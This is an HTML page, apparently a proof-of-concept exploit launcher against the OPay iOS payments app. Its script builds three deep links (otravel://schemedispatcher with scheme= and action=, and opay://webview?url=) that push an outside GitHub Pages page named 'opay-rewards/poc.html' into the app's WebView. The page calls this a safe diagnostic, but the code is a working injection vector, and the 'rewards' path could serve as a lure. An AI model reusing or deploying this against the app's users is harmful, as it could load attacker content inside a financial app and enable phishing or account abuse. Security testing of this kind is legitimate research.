<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OPay iOS Deep Link Tester</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
            background: linear-gradient(135deg, #00c853 0%, #009624 100%);
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card { background: white; border-radius: 16px; padding: 28px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,.2); }
        h1 { color: #222; font-size: 22px; margin-bottom: 8px; }
        .sub { color: #666; font-size: 14px; margin-bottom: 18px; }
        .btn { display: block; width: 100%; padding: 14px; margin: 8px 0; background: #00c853; color: #fff; text-decoration: none; border-radius: 10px; font-weight: bold; }
        .btn.alt { background: #1a73e8; }
        .btn.ghost { background: #333; }
        .status { font-size: 12px; color: #888; margin-top: 10px; min-height: 16px; }
    </style>
</head>

<body>
    <div class="card">
        <h1>OPay iOS Deep Link Test</h1>
        <div class="sub">Try the methods below to open a safe WebView diagnostic page.</div>

        <a id="btnA" class="btn" href="#">Method A: otravel scheme=</a>
        <a id="btnB" class="btn alt" href="#">Method B: opay://webview</a>
        <a id="btnC" class="btn ghost" href="#">Method C: otravel action=</a>

        <div class="status" id="status"></div>
    </div>

    <script>
        var base = 'https://zugonwobi.github.io/opay-rewards/';
        var payload = base + 'poc.html?v=' + Date.now();
        var encoded = encodeURIComponent(payload);

        var A = 'otravel://schemedispatcher?scheme=' + encoded;
        var B = 'opay://webview?url=' + encoded;
        var C = 'otravel://schemedispatcher?action=' + encoded;

        var statusEl = document.getElementById('status');
        function bind(id, url, label) {
            var el = document.getElementById(id);
            el.href = url;
            el.addEventListener('click', function () {
                statusEl.textContent = 'Opening ' + label + '...';
            });
        }

        bind('btnA', A, 'Method A');
        bind('btnB', B, 'Method B');
        bind('btnC', C, 'Method C');
    </script>
</body>

</html>
